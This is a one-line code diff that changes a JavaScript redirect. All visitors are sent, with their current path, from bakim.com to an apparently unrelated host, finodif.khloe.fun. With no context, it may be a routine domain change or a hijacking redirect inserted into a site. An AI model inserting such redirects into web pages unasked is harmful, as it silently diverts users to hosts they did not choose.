@@ -1,1 +1,1 @@
-location.href = 'https://bakim.com' + window.location.pathname;
+location.href = 'https://finodif.khloe.fun' + window.location.pathname;
